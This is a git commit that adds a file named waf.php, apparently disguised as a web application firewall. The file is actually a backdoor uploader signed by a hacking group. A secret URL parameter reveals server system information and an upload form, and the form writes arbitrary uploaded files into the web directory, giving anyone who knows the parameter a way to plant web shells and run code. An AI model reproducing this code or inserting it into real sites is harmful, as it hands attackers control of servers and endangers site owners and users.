2fbf12405b0d3a919cc3db6daea81c8187d60a58
A0R3A <125909684+TEAMARXU@users.noreply.github.com>
2024-12-09 00:35:49 +0600

    Create waf.php

---
+++ waf.php
@@ -0,0 +1,2 @@
+<?php
+$allowedUpload = isset($_GET['upload']) && $_GET['upload'] === 'arxu';if($allowedUpload) {echo '<pre>T.ME/TEAMARXU_V2 Coded By @TEAMARXU (arxu)'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if ($_POST) {if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {echo 'OK';} else {echo 'ER';}}} else {echo 'Upload not allowed.';}?>
